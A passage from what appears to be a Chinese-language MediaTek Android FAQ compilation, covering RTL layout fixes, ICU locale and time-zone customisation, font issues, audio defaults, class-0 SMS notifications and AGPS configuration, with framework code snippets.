    { HB_ArabicShape},
    // Thaana
    { HB_BasicShape},
    // Devanagari
    { HB_IndicShape},
    // Bengali
    { HB_IndicShape},
    // Gurmukhi
    { HB_IndicShape},
    // Gujarati
    { HB_IndicShape},
    // Oriya
    { HB_IndicShape},
    // Tamil
    { HB_IndicShape},
    // Telugu
    { HB_IndicShape},
    // Kannada
    { HB_IndicShape},
    // Malayalam
    { HB_IndicShape},
    // Sinhala
    { HB_IndicShape},
    // Thai
    { HB_BasicShape},
    // Lao
    { HB_BasicShape},
    // Tibetan
    { HB_TibetanShape},
    // Myanmar
#ifdef ZAWGYI_SUPPORT
    { HB_ZawgyiShape },
#else
    {HB_MyanmarShape},
#endif
    // GeorgianRecents
    { HB_BasicShape},
    // Hangul
    { HB_HangulShape},
    // Ogham
    { HB_BasicShape},
    // Runic
    { HB_BasicShape},
    // Khmer
    { HB_KhmerShape},
    // N'Ko
    { HB_ArabicShape}
};
JB版本的文件目录external\harfbuzz\src\，结构稍有不同。
PS：如果是新增一种复杂语言，可以先看看这个语言的字符是不是和已经支持的语言字符一样，如果是，则不需新增引擎。
```

## [RTL]  [FAQ09199]  切换到阿拉伯语、波斯等RTL语言音量调节图标没变化

```text
这是 google 的 issue, google 也已经在最新的 JB 修正了, 修正的方法如下
1. \alps\frameworks\base\media\java\android\media\AudioService.java
在 handleConfigurationChanged() 增加一行  mVolumePanel.setLayoutDirection(config.getLayoutDirection()); 如下

private void handleConfigurationChanged(Context context) {
    try {
        .......
        mVolumePanel.setLayoutDirection(config.getLayoutDirection());
    } catch (Exception e) {
        Log.e(TAG, "Error retrieving device orientation: " + e);
    }
}
2. \alps\frameworks\base\core\java\android\view\VolumePanel.java 请新增一 API

public void setLayoutDirection(int layoutDirection) {
    mPanel.setLayoutDirection(layoutDirection);
    updateStates();
}
```

## [RTL]  [FAQ08961]  当前语言设置为阿拉伯语时，有的ListView的Item没有右对齐

```text
ListView的Item是由TextView组成的，TextView会判断字符串是什么语言，如果是英文就左对齐，如果是阿拉伯语就右对齐。
如果需要使阿拉伯语下这样的TextView右对齐，下面有两点建议：
1、请把这些字串翻译成阿拉伯语，ListView的Item自然会右对齐；
2、如果不想翻译，可以在Adapter的getView方法中判断当前语言，如果当前语言是阿拉伯语，可以设置Item的Gravity属性为RIGHT，大概如下：
String locale = Locale.getDefault().getLanguage();
if(locale.equals("ar")){
   textView.setGravity(Gravity.RIGHT);
}else{
   textView.setGravity(Gravity.LEFT); 
}
```

## [RTL]  [FAQ09127]  为什么输入RTL字符时，光标分成两段

```text
首先需要知道RTL语言和LTR语言，RTL(right to left)语言是指这种语言的字符的输入和显示顺序是从右到左的，一般情况下该语言字符串在手机中都会靠右显示，常见的RTL语言如阿拉伯语(ar)，波斯语(fa)，乌尔都语(ur)，希伯来语(he/iw)等；与之对应的，LTR(left to right)语言是指从左到右输入和显示的语言，世界上大多数语言属于LTR语言，常见的英语，中文，意大利语，德语，西班牙语，葡萄牙语等等都是LTR语言。

光标分2个部分的原因是：RTL和LTR语言的显示方向是不一样的，当它们混合输入时会出现光标跳动，比如一开始输入阿拉伯语，方向是从右到左，输入英语时，方向是从左到右，此时光标会跳动到最左边的阿拉伯语上。这种混合输入可以到google网站上去体验一下。
而采用多种语言算法之后，就不会出现这种光标跳动现象了，当输入方向发生变化时，会将光标分为2个部分，分别在需要变化方向的字符的2旁，有一个是主光标，一个是副光标。主光标是根当前字符的输入方向一致的，而副光标是原本的光标位置。
 
因此，这样的设计是为了多种文字混合输入时，给用户较好的体验，并非BUG。
```

## [RTL]  [FAQ10009]  阿拉伯语、波斯语等RTL语言下部分控件位置不对

```text
一些RTL语言比如阿拉伯语、波斯语，其layout布局以及Text显示方向是从右到左的，android4.2版本及以后新增属性android:supportsRtl可以实现这种功能。然而对于一下特殊的字符串，比如波斯语和英文混合的字串、纯英文字串以及一些特殊的控件并不能实现从右到左显示。对于这些问题，下面给出一些例子和解法。

 关于supportsRtl的使用可以参考：FAQ08672

1、混合字符或者纯英文下，TextView没有居右。

A、找到其定义的layout文件

用 match_parent替换wrap_content，如果替换后还是没有效果新增

android:textDirection="locale”这个属性。

例如Preference summary英文下没有居右，可以如下修改

frameworks\base\core\res\res\layout\Preference_holo.xml

<TextView android:id="@+android:id/summary"

android:layout_width="match_parent"

……

android:textDirection="locale"

B、如果找不到其layout，可以在code中使用如下函数进行设置

setGravity(Gravity.RIGHT);

setTextDirection(TEXT_DIRECTION_RTL);

例如spinner控件波斯语下英文字串没有居右，可以如下修改

public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {

String language = Locale.getDefault().getLanguage();

if(language.equals("ar")||language.equals("fa")){

   TextView textview =(textview )view;

textview.setGravity(Gravity.RIGHT);

 }

……

2、对于一些控件没有居右或者layout布局错乱的问题

应检查layout的“left/right”布局属性，是否已经改为对应的”start/end”属性。具体例子可以参考FAQ08672。

3、对于一些图片方向不对的问题

对于这些图片需要按照RTL重新设计，然后放到drawable-ldrtl-hdpi文件夹下。比如actionbar的那个竖线，使用的地方如下

<selector xmlns:android="http://schemas.android.com/apk/res/android">
    <item android:state_pressed="true" android:drawable="@drawable/btn_cab_done_pressed_holo_dark" />
    <item android:state_focused="true" android:state_enabled="true" android:drawable="@drawable/btn_cab_done_focused_holo_dark" />
    <item android:state_enabled="true" android:drawable="@drawable/btn_cab_done_default_holo_dark" />
</selector>
上面那些图片位置在frameworks\base\core\res\res\drawable-hdpi，重新绘制后放到

frameworks\base\core\res\res\drawable-ldrtl-hdpi目录下

4、其他RTL相关的问题可以参考，

FAQ10002： 如何修改Notifation Action Button的Icon和Text的位置
FAQ09199： 切换到阿拉伯语、波斯等RTL语言音量调节图标没变化
FAQ09094： RTL语言下电话号码从右向左显示的问题
FAQ08961： 当前语言设置为阿拉伯语时，ListView的Item有的左对齐，有的右对齐
FAQ09127： 为什么输入RTL语言时，光标分成两段显示
```

## [RTL]  [FAQ08672]  如何实现界面布局根据阿拉伯语、波斯语等RTL语言而反转

```text
android4.2 新增了RTL布局镜面反射，这种镜面反射其实就是根据语言显示方向调整layout布局，但google只是对少数app进行了设置，比如setting。如果想要在其他应用中使用这特性可以按照如下进行修改：
1、在AndroidManifest.xml声明文件的<application>元素中，添加” android:supportsRtl=true”。
2、把android:targetSdkVersion="16" 改成17。
3、修改应用程序中layout的“left/right”布局属性，改为对应的”start/end”布局。

注意：状态栏比较特殊，如果要发送的通知也可以使用RTL布局，除了修改SystemUI模块的AndroidManifest.xml文件，还需要修改发送通知的ap的AndroidManifest.xml文件。

如修改radiabutton使其有这种效果，可以修改文件
packages\apps\Settings\res\layout\preference_radiobutton.xml
如下地方
<RadioButton
    android:id="@+id/preference_radiobutton"
    android:layout_width="wrap_content"
    android:layout_height="match_parent"
    android:layout_alignParentEnd="true"
    android:paddingStart="30dip"
    android:paddingEnd="20dip"
    android:focusable="false"/>

<TextView android:id="@+id/preference_title"
    android:layout_width="wrap_content"
    android:layout_height="match_parent"
    android:textAppearance="?android:attr/textAppearanceMedium"
    android:layout_alignParentStart="true"
    android:layout_marginStart="9dip"
    android:layout_marginTop="6dip"
    android:layout_marginBottom="6dip"
    android:paddingEnd="60dip"
    android:maxLines="1"
    android:singleLine="true"
    android:ellipsize="marquee"
    android:focusable="false"/>

关于supportsRtl的详细介绍可以浏览如下网页

http://android-developers.blogspot.tw/2013/03/native-rtl-support-in-android-42.html
```

## [FAQ08718]  [clock] 如何修改时区的显示名称

```text
目前对于有些地区，很多国家会使用一个时区，显示的名称也是一样，比如对于欧洲，很多城市使用“欧洲中部时间”“中欧夏令时”，非洲国家也是类似的。对于有些客户，可能有定制显示需求，对于某些时区，不显示“xx中部时间”，而是显示“xx时间”，比如下面会以荷兰阿姆斯特丹为例，目前在手机Setting中选择“Amsterdam,Berlin”后在Date&Time界面会显示“Central European Summer Time”，下面是修改荷兰语下这个显示为自定义名称的过程。

【Solution】：

时区Europe/Amsterdam目前显示出来的时间是“欧洲中部时间”或“欧洲中部时间”，如果要修改荷兰语下显示为“阿姆斯特丹时间”或其他自定义的显示，请follow下面的修改：

1. 找到时区ID
时区id并不是城市名称，手机显示到时区列表上的时区名称与时区id有映射关系，可以通过查看Settings中的timezones.xml来确定，package/apps/Settings/res/xml-zh/timezones.xml是中文。这样可以找到Amsterdam,Berlin的时区id是Europe/Amsterdam。

2. 修改metaZones.txt文件（android kk external\icu4c\data\misc\
  android L external\icu\icu4c\source\data\misc\
  android M external\icu\icu4c\source\data\misc\）
1)    修改mapTimezones
修改的目的是把时区添加到自己定义的显示规则中，这样通过时区ID  Europe/Amsterdam就可以得到该显示规则Europe_Amsterdam。这个步骤分2步：

a)      定义自己的显示规则名称
         比如我定义了新的规则Europe_Amsterdam， 需要在mapTimezones中添加进去，mapTimezones中顺序是按字母排序的，所以Europe_Amsterdam这个规则要添加到Europe_Central的前面，如下：

Europe_Amsterdam{

}

b)     将要修改的时区从原规则中删除，添加到自定义的规则中
找到要修改的时区，比如Europe/Amsterdam在Europe_Central中，

剪切NL{“Europe/Amsterdam”}，粘贴到自定义的时区显示规则中，如下所示：

Europe_Amsterdam{

NL{“Europe/Amsterdam”}

}

如果此文件中没有包含要修改的时区，那么就需要添加此时区，添加的内容如上面所示，时区前面的两个字母是国家代码。

2)    修改metaZoneinfo
添加meta信息,这样就可以通过显示规则名称Europe_Amsterdam得到meta信息Europe:Amsterdam。

“Europe:Amsterdam”{
{“Europe_Amsterdam”}
}

3. 修改zone/nl.txt文件（adnroid kk external\icu4c\data\
android L external\icu\icu4c\source\data\

android M external\icu\icu4c\source\data\）
不同的txt文件代表的是不同语言，语言和区域代码可通过查询ISO-3166-1和ISO-639标准确定。

定义在界面显示的字串，这样根据之前得到的meta信息可以得到要显示的字串。

同样的，名称是按照字母排序的，所以在Europe_Central前面添加，如下：

“meta: Europe_Amsterdam”{

ld{“夏令时间显示名称”}

ls{“标准时间显示名称”}

}

4. 编译ICU资源
请参考FAQ04011进行编译和测试
```

## [icu]  [FAQ11960]  [clock]  印尼语下时间格式显示成hh.mm

```text
KK版本系统语言切换到印尼语，发现时间格式显示成hh.mm,如果想要改成hh：mm改如何操作。

这个时间格式来自于底层ICU资源，如下定义
external/icu4c/data/locales/id.txt
gregorian{
    DateTimePatterns{
    "h.mm.ss a zzzz",
    "h.mm.ss a z",
    "h.mm.ss a",
    "h.mm a",
    ……
如果是其他语言有类似问题可以参照修改
```

## [icu]  [FAQ11512]  语言名称客制化问题

```text
Android语言名称定义在external/icu4c/data/lang/各个语言txt文件中 ，如zh.txt(中文简体):
Languages{
    aa{"阿法文"}
    ab{"阿布哈西亚文"}
    ace{"亚齐文"}
……

调用这些字串接口定义在Locale.java（libcore\luni\src\main\java\java\util)，主要函数如下：
(1)获得指定语言环境(locale)下语言名称
public String getDisplayLanguage(Locale locale)

(2)获得系统默认语言环境的语言名称
public String getDisplayLanguage()

(3) 获得指定语言环境(locale)下带有使用国家的语言名称
public String getDisplayName(Locale locale)

(4) 获得系统默认语言环境下带有使用国家的语言名称
public String getDisplayName()
因此如果要客制化语言名称可以有如下几种方法
1、修改ICU资源，如把aa{"阿法文"}改为aa{"阿发闻"}
这个修改需要编译ICU资源才会起效，如何编译可以参考：FAQ04011
2、修改Locale.java相关函数，如修改菲律宾语返回值，可以参考FAQ11034
3、也可以在app层做相关修改，如setting app中的中文定制，具体可以参考FAQ09198

需要注意的是方法1、2的修改可能导致CTS测试fail，有些语言名称是不能修改的，具体可以参考LocaleTest.java(libcore\luni\src\test\java\libcore\java\util)
```

## [icu]  [FAQ08671]  音频ID3、文本编码问题

```text
Android在编码这块主要指的是音频ID3解码和文本解码。
1、  音频ID3解码。
Android默认支持的编码格式有，utf-8、unicode、shiftJIS、gbk(gb2312)、big5、iso8859-1、EUCKR。

2、  文本解码。
Android默认的文本解码使用的是htmlviewer。其编码识别原理是根据文本字符计算各个编码的可信度，可信度高的就会用来解码。这种原理其实是为每种编码建立一个“常用字符表”，然后计算每种编码的匹配度。在计算可信度的时候有一些特殊处理，比如当字符个数比较少(少于10个)，此时可信度非常低，如果文本字符又不是“常用的字符表”中的字符，这样可信度几乎为0。例如，中文txt如果字符个数少于10，且不是“常用字符表”中的字符就会出现乱码。基于其的编码识别的缺陷，MTK在ICS及以后的版本就关闭了htmlviewer对txt文本的识别。需要补充的一些常用编码是支持的，但是解码可信度却不一定高，详情可参考如下：

<a>常用编码列表fCSRecognizers

csdetect.cpp(alps\external\icu4c\i18n)

<b>常用字符表

csrmbcs.cpp(alps\external\icu4c\i18n)

如中文gb18030，commonChars_gb_18030[] 
如果需要更好的支持文本解码，建议内置第三方文本解码器。
```

## [FAQ18543]  [NW] 如何设置CDMA only模式

```text
如果要设置为CDMA Only模式，需要进入*#*#3646633#*#* 工模做如下设置：
1. 工模--> C2K IR Setting,选择CDMA Only；然后重启，重新启动后，只会开启CDMA Modem的Radio。
2. 工模--> CDMA Network select，里面可以选择Hybrid / CDMA 1x Only / EVDO Only
```

## [FAQ10020]  一些字符显示不清晰(修改TTF字体文件)

```text
这个问题可以通过修改字库解决，方法如下：

1、找到孟加拉语字库Lohit-Bengali.ttf(external/lohit-fonts/lohit-bengali-ttf/)
2、使用字库工具打开上述字库文件。字库工具FontCreater5.6载网址为：    http://so.pc6.com/?keyword=FontCreat&searchType=down
3、Ctrl+F查找$0985这个字形,右键->”编辑”,调整其笔画粗细,如下图所示：
4、修改后可以push到system/fonts下,然后重新开机查看效果

[FAQ12287]  如何修改或添加字库字体
[FAQ09950]  越南语字母ỡ显示为õ
[FAQ04224]  KK版本字库文件介绍
```

## [FAQ09896]  动态切换字体过程中内存占用不断增加的解决办法

```text
按照如下原DMS文档(现已更新)，实现了切换字体功能
Font Install and Runtime Change On ICS guideline.doc
 
按照参考文档完成此feature之后,发现不断在不同字体之间切换,手机内存占用会不断增加
这是因为typeface的createFromAsset接口有BUG,每调用一次该接口,native memory占用就会增加,这个问题属于Google Bug,目前尚无完美的解决方案,但是可以使用下面的方法work around.
 
[SOLUTION] 
1.修改framework中的typeface.java文件
增加以下代码:
import java.util.Hashtable;
 private static final String TAG = "Typefaces";
 private static final Hashtable<String, Typeface> cache = new Hashtable<String, Typeface>();
 public static Typeface get(AssetManager mgr, String assetPath) {
  synchronized (cache) {
   if (!cache.containsKey(assetPath)) {
    try {
     Typeface t = Typeface.createFromAsset(mgr, assetPath);
     cache.put(assetPath, t);
    } catch (Exception e) {
     return null;
    }
   }
   return cache.get(assetPath);
  }
 }
 
2.修改Textview.java,
将Typeface.createFromAsset(...)替换成新加的Typeface.get(...)接口
根据我司提供的文档,需要修改的地方有2处,分别在textview构造函数,与setTextAppearance函数中.
```

## [clock]  [默认值]  [FAQ08948]  【DateFormat】如何修改设置中待选的日期格式

```text
日期格式选择时，弹出窗口中的日期格式是从R.array.date_format_values中拿到的。
文件：package/apps/Settings/res/values/arrays.xml （所有语言都是这个文件）
描述：
 <string-array name="date_format_values" translatable="false">
        <!-- The blank item means to use whatever the locale calls for. -->
        <item></item>
        <item>MM-dd-yyyy</item>
        <item>dd-MM-yyyy</item>
        <item>yyyy-MM-dd</item>
        <item>EE-MMM-d-yyyy</item>
        <item>EE-d-MMM-yyyy</item>
        <item>yyyy-MMM-d-EE</item>
    </string-array>
第一个空的item即为默认的日期格式，请不要修改；
第2-7个对应显示出来的6个日期格式，可以修改，也可以增加新的格式。
 
需要注意的是，在格式中只能用系统能够识别的字符来制定格式，yyyy是年份，MM是月份，dd是日，EE是星期几。
 
相关逻辑：
然后，在DateFormat的getDateFormatStringForSetting方法中，对取得的格式进行了处理，对于每一项都会进行替换处理。
 
比如对于yyyy-MMM-d-EE这个格式，在系统语言为中文时，就会找到
Donottranslate-cldr.xml (mediatek\frameworks\base\res\res\values-zh-rCN)中的下面这一项：
<string name="year_month_day_wday">"%s年 %s %s日, %s"</string>
这样显示到界面上就是“2013年12月31日，星期一”
对于 KK和L ，M版本定义在：
frameworks\base\core\res\res\values-zh-rCN\donottranslate-cldr.xml中的numeric_date_template；

 
对于非中文的其他语言，会调用Donottranslate-cldr.xml (mediatek\frameworks\base\res\res\values)中的对应字符串进行替换。
所以中文和其他语言是不一样的。 
```

## [FAQ17570]  [Audio APP] 安装多个音乐播放器时，如何将某个播放器设为默认播放器

```text
需要修改 
/frameworks/base/services/core/java/com/android/server/pm/PackageManagerService.java
 
共有如下3步：
1：在 systemReady 方法的最后加入 setDefaultMusicPlayer(); 方法的调用
2：后面是实现setDefaultMusicPlayer 这个方法，具体实现代码如下：
 
public void setDefaultMusicPlayer() { 
final String strComponentName = "com.android.music/com.android.music.AudioPreviewStarter";//这是定义希望默认启动的播放器对应有 activity 全名，本例是以 com.android.music 为例
ComponentName defaultLauncher = ComponentName.unflattenFromString(strComponentName);
Log.e(TAG,"defaultLauncher========"+defaultLauncher);
if (defaultLauncher != null) {
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.addCategory(Intent.CATEGORY_DEFAULT);
Uri uri = Uri.parse("file://");
intent.setDataAndType(uri, "audio/mpeg");
List<ResolveInfo> resolveInfoList = queryIntentActivities(intent, intent.getType(), 
PackageManager.GET_INTENT_FILTERS, 0);
if (resolveInfoList != null) {
int size = resolveInfoList.size();
Log.e(TAG,"size++++++++++=="+size);
Log.e(TAG,"defaultLauncher.getPackageName()=="+defaultLauncher.getPackageName());
for (int j = 0; j < size;) {
final ResolveInfo r = resolveInfoList.get(j);
Log.e(TAG,r.activityInfo.packageName+"/ activity: "+r.activityInfo.name);
if (!r.activityInfo.packageName.equals(defaultLauncher.getPackageName())) {
resolveInfoList.remove(j);
size -= 1;
}else{
j++;
}
}
ComponentName[]  set = new ComponentName[size] ;
Log.e(TAG,"size============="+size);
int defaultMatch = 0;
for (int i = 0; i < size; i++) {
final ResolveInfo resolveInfo = resolveInfoList.get(i);
Log.d(TAG, resolveInfo.toString());
set[i]  = new ComponentName(resolveInfo.activityInfo.packageName,
resolveInfo.activityInfo.name);
if (defaultLauncher.getClassName().equals(resolveInfo.activityInfo.name)) {
defaultMatch = resolveInfo.match;
}
}
Log.e(TAG,"defaultMatch="+ Integer.toHexString(defaultMatch));
try{ 
IntentFilter filter = new IntentFilter(); 
filter.addAction(Intent.ACTION_VIEW); 
filter.addCategory(Intent.CATEGORY_DEFAULT); 
filter.addDataType("audio/mpeg");//add this line 
Log.e(TAG,"defaultMatch============"+defaultMatch);
addPreferredActivity2(filter, defaultMatch, set,defaultLauncher);
}catch (IntentFilter.MalformedMimeTypeException e) { 
e.printStackTrace(); 
}
}
}
}

public void addPreferredActivity2(IntentFilter filter, int match,ComponentName[]  set, ComponentName activity) {
Log.d(TAG,"addPreferredActivity2 is called.");

synchronized (mPackages) { 
Slog.i(TAG, "Adding preferred activity " + activity + ":");
filter.dump(new LogPrinter(Log.INFO, TAG), " ");
mSettings.editPreferredActivitiesLPw(0).addFilter(new PreferredActivity(filter, match, set, activity,true));
mSettings.writePackageRestrictionsLPr(0); 
}
}
 
3: 修改此文件中的 findPreferredActivity 方法，在如下参考行相对位置加入对应代码：
if (always && !pa.mPref.sameSet(query, priority)) {//参考行
    //add begin
    if(intent !=null && intent.getAction().equals("android.intent.action.VIEW") && intent.getType().equals("audio/mpeg")){
        Slog.i(TAG, "Result set NOT change for " + intent + " type " + resolvedType);
        Slog.v(TAG, "Returning preferred activity: " + ri.activityInfo.packageName + "/" + ri.activityInfo.name);
        changed = false;
        return ri;
    }
    //add end
    Slog.i(TAG, "Result set changed, dropping preferred activity for " + intent + " type " + resolvedType);//参考行
    if (DEBUG_PREFERRED) {
        Slog.v(TAG, "Removing preferred activity since set changed " + pa.mPref.mComponent);
    }
    pir.removeFilter(pa);
    // Re-add the filter as a "last chosen" entry (!always)
    PreferredActivity lastChosen = new PreferredActivity(pa, pa.mPref.mMatch, null, pa.mPref.mComponent, false);
    pir.addFilter(lastChosen);
    changed = true;
    return null;
}
```

## [默认值]  [FAQ08273]  [Audio Profile] 如何设置视频来电的默认铃声

```text
背景：
原始设计语音来电铃声和视频来电铃声是一起设置的。即设置的默认铃声同时是语音来电和视频来电的铃声。
 
需求：
只想单独设置视频来电的默认铃声。
 
实现思路：
参考原先来电铃声的设置机制，给视频来电铃声单独设置属性写默认的铃声名称，然后在文件扫描时，判断扫描到的文件是设置的默认视频铃声的文件名，则在database中填写视频来电的键值为此铃声；
 
PS:被设置的铃声首先要存在于系统中，关于如何添加系统铃声请参考”FAQ06323[Audio Profile] 如何添加以及删减特定的默认通知铃声，如何设置默认铃声”；
 
[SOLUTION] 
 
1，添加Video Call默认铃声的属性：
alps\build\target\product\core.mk中添加“ro.config.video_call”：

PRODUCT_PROPERTY_OVERRIDES := \
    ro.config.notification_sound=Proxima.ogg \
    ro.config.alarm_alert=Alarm_Classic.ogg \
    ro.config.ringtone=Backroad.ogg \
    ro.config.video_call=VideocallRt.ogg

 
2，添加对扫描到文件的判断是否是默认Video Call的默认铃声：
alps\frameworks\base\media\java\android\media\mediascanner.java:

1),添加成员变量用做后面的判断：
private String mDefaultRingtoneFilename;
private String mDefaultVideocallFilename;
private boolean mDefaultRingtoneSet;
private boolean mDefaultVideoCallSet;
private static final String RINGTONE_SET = "ringtone_set";
private static final String VIDEOCALL_SET = "videocall_set";

2):添加读取video call默认铃声的系统属性：
private void setDefaultRingtoneFileNames() {
    mDefaultRingtoneFilename = SystemProperties.get(DEFAULT_RINGTONE_PROPERTY_PREFIX + Settings.System.RINGTONE);
    mDefaultVideocallFilename = SystemProperties.get(DEFAULT_RINGTONE_PROPERTY_PREFIX + Settings.System.VIDEO_CALL);//add this line
    ...
}
 
3):添加对扫描到的文件是否是视频来电默认铃声的判断：
参考标有//start modify”和//end modify”中间包含的为添加整段code，"//add this line"和”Modify this line"为添加添加的语句和修改的语句。
并请留意“else if (ringtones && doesSettingEmpty(RINGTONE_SET)&&!videocall) {”中要一定注释掉对VideoCall的设置：

private Uri endFile() {
       boolean isVideoCall = false; //add this line;
       boolean isVoiceCall = false; //add this line, in case the video call and voice call have same ringtone;
.....
if (notifications &&((mWasEmptyPriorToScan && !mDefaultNotificationSet) || doesSettingEmpty(NOTIFICATION_SET))) {
....
//start modify
} else if(ringtones && ((mWasEmptyPriorToScan && (!mDefaultRingtoneSet||!mDefaultVideoCallSet)) || doesSettingEmpty(RINGTONE_SET)|| doesSettingEmpty(VIDEOCALL_SET))) {
                    if (TextUtils.isEmpty(mDefaultRingtoneFilename) ||
                            doesPathHaveFilename(entry.mPath, mDefaultRingtoneFilename)) {
                        needToSetSettings = true;
                         isVoiceCall = true; //add this line
                        /// M: Adds log to debug setting ringtones.
                        Xlog.v(TAG, "endFile: needToSetRingtone=true.");
                    }
                    if (TextUtils.isEmpty(mDefaultVideocallFilename) ||
                            doesPathHaveFilename(entry.mPath, mDefaultVideocallFilename)) {
                        needToSetSettings = true;
                        isVideoCall = true;
                        /// M: Adds log to debug setting ringtones.
                        Xlog.v(TAG, "endFile: needToSetRingtone=true.");
                    }

                } else if (alarms && ((mWasEmptyPriorToScan && !mDefaultAlarmSet) ||
                        doesSettingEmpty(ALARM_SET))) {
                      ...                   
}
 
...
if(needToSetSettings) {
                if (notifications && doesSettingEmpty(NOTIFICATION_SET)) {
                  .....
//start modify
                } else if (ringtones && (doesSettingEmpty(RINGTONE_SET)||doesSettingEmpty(VIDEOCALL_SET)) {
                    if(isVideoCall ){
                     setSettingIfNotSet(Settings.System.VIDEO_CALL, tableUri, rowId);
                    setProfileSettings(RingtoneManager.TYPE_VIDEO_CALL, tableUri, rowId);
                    mDefaultVideoCallSet = true;
                    setSettingFlag(VIDEOCALL_SET);
                    }
                   if(isVoiceCall ){
                    setSettingIfNotSet(Settings.System.RINGTONE, tableUri, rowId);
                   // setSettingIfNotSet(Settings.System.VIDEO_CALL, tableUri, rowId); //modify this line
                    setSettingIfNotSet(Settings.System.SIP_CALL, tableUri, rowId);
                    setProfileSettings(RingtoneManager.TYPE_RINGTONE, tableUri, rowId);
                   // setProfileSettings(RingtoneManager.TYPE_VIDEO_CALL, tableUri, rowId);//modify this line
                    setProfileSettings(RingtoneManager.TYPE_SIP_CALL, tableUri, rowId);
                    mDefaultRingtoneSet = true;
                    setSettingFlag(RINGTONE_SET);
                    }

                    Xlog.v(TAG, "endFile: set ringtone. uri=" + tableUri + ", rowId=" + rowId);
                 //end modify
                }else if (alarms && doesSettingEmpty(ALARM_SET)) {
                   ....
            }
```

## [debug]  [FAQ13579]  [Audio framework] 后台播放music，如何判断是哪个app播放

```text
这是一个 change feature 的实现
此 feature 的目的是查询当前是哪个 app 正在播放音乐

[SOLUTION] 
1: 修改 frameworks\base\media\java\android\media\IAudioService.aidl, 加入方法声明:
String getFocusedPackageName();

2: frameworks\base\media\java\android\media\AudioService.java 中加入方法:
public String getFocusedPackageName(){
    return mMediaFocusControl.getFocusedPackageName();
}

3: MediaFocusControl.java 增加方法
protected String getFocusedpackageName(){
    synchronized(mAudioFocusLock){
        if(mFocusStack.empty()){
            return "";
        }else{
            return mFocusStack.peek().getPackageName();
        }
    }
}

4: FocusRequester.java增加方法
public String getPackageName(){
    return mPackageName;
}
 
则上层通过调用 AudioService 的 getFocusedPackageName 接口即可获取到需要的数据
 
相关FAQ:
FAQ12909 [Audio Common] 耳机按键功能定制: 单击:播放/暂停音乐，双击:下一首，三击:上一首
FAQ14329 [如何在Framework层互斥两个第三方音乐播放器] 
FAQ14660 音量警告提示框选择OK，重启后再按侧键增大音量希望还会弹出音量警告提示框
FAQ15283 [Audio Driver]  手机放音乐时连接音箱, 将音箱音量调到最大时，音乐暂停
```

## [FAQ09402]  [Audio App] WMA格式的支持/关闭

```text
WMA格式的支持:
1.客户需要跟微软签订license
2.MTK内部查询确认客户有license后，申请patch:
a.在KK版本之前
mediatek/config/$project/projectconfig.mk中开启MTK_ASF_PLAYBACK_SUPPORT= yes
b.在KK版本之后（含）
mediatek/config/$project/projectconfig.mk中开启
MTK_WMA_PLAYBACK_SUPPORT=yes
MTK_SWIP_WMAPRO=yes
 
WMA格式的关闭:
有些客户没有跟微软签订license, 却发现也可以播放 wma 文件, 此时需要通过以下方法关闭 wma 文件的播放支持
到 mediatek/config/common/ProjectConfig.mk 中找到以下两个宏的定义 (KK 版本)
MTK_WMV_PLAYBACK_SUPPORT
MTK_WMA_PLAYBACK_SUPPORT
把它们的值都改为 no
```

## [FAQ18471]  俄罗斯收到Class0短信下拉状态条和锁屏界面显示空白内容

```text
1.首先要确认是否用户收到的Class0短信，查看方式在Radiolog中查找CMT，将CMT后面带的数字例如 07919762020033F1240B919752101008F90010616032019201210355F618
复制到PDUspy工具中，粘贴在Manual --》incoming中，然后点Decode。解析出来的画面如下：红色框中显示的就是Class0 message.
 
按照spec 规定class 0 的 SMS 的，表示 只是给用户显示，不能存储。
目前的design没有显示内容和号码和 不能点击的原因，是因为class 0的信息没有存储到数据库中。

在google default code中class0 sms没有弹notification的功能 ，
所以针对这样的问题 ，
一种解决方法，和google 原始的设计 一样，直接 注释 掉 notifyClassZeroMessage ，当有class0 的sms 不在notifycation 里提醒。
 
另一种，如果一定要弹notification的功能，若需要考虑显示的话，则可以考虑显示最近一条的信息。可以考虑参考如下方法修改：

1. 修改MessagingNotification.notifyClassZeroMessage()，将body传递进去
public static boolean notifyClassZeroMessage(Context context, String address, String body) {
2. 并在notification中显示出来，大约在MessagingNotification的1888行
Notification notification = new Notification.Builder(context)
.setContentTitle(address)
.setContentText(body)
.setSmallIcon(R.drawable.stat_notify_sms).build();
3. 修改其调用的地方SmsReceiverService, 大约在676行
MessagingNotification.notifyClassZeroMessage(this, msgs[0] 
.getOriginatingAddress(), messageChars.toString());

还有哪些短信类型??????
PDUSpy工具下载??????
```

## [gps]  [FAQ07233]  如何在设置中默认打开EPO，AGPS功能以提高用户体验

```text
alps\mediatek\frameworks\base\agps\etc\agps_profiles_conf.xml
  <agps_conf_para
    agps_enable="no"  ==> 改成"yes"
    disable_after_reboot="no" ==> 保持"no"
alps\mediatek\frameworks\base\epo\etc\epo_conf.xml
  <epo_conf_para
   epo_enable="no"  ==> 改成"yes"
   auto_enable="no"  ==> 改成"yes”
```

## [gps]  [FAQ02932]  把AGPS默认打开，请问如何修改

```text
如果是第一次开机就默认开启A-GPS，您只需要修改
alps\vendor\mediatek\etc\agps_profiles_conf.xml文件中的agps_enable 有被设置为如下即可：
agps_enable="yes"

另外，A-GPS的开启还需要其他的一些条件，包括
1.有开启GPS
2.当前有已经连接的数据连接。

所以，如果是上个文件中的值有被设置为yes，而在开机时GPS没有开启，或者是数据连接没有开启，也不会自动开启A-GPS。需要end user手动进入到setting内开启。

UI将Agps开启并不表示Agps的会话立即被触发，只是表示有机会被GPS调用而启动。
```

## [gps]  [FAQ02930]  设置 - 位置 - AGPS设置 - 使用配置 默认是GOOGLE， 如何修改默认成别的值,如Nokia

```text
修改agps_profiles_conf.xml中的
default_profile="GOOGLE"
修改为
default_profile="NOKIA"
即可。
```

## [gps]  [FAQ02929]  AGPS的协议版本

```text
FDD2上面的A-GPS已經有通過FTA的所有測項,CP + SUPL v1.0.

JB2之后版本支持SUPL2.0兼容1.0 
不過由于实际网络没有支持SUPL 2.0的server
为了避免发出的SUPL START带2.0版号会被Sever拒绝，出厂设置都是设成仅支持SUPL1.0

所以 SUPL 2.0 仅限于Lab测试使用

在JB5有修正设计，即使手机设置没有Enable  SUPL 2.0
但是网络发起定位（NI）的SUPL-INIT中，Sever田的版号是2.0 我们就会以2.0的版号回复
所以JB5开始SUPL 2.0的开关只会影响手机发起的（SI）部分只會影響手機發起(SI)部分

/alps/mediatek/frameworks/base/agps/etc/agps_profiles_conf.xml
supl_version: (for UP only)
choose which SUPL version you want to use
Available value: 1, 2

目前设置
supl_version="1"
```

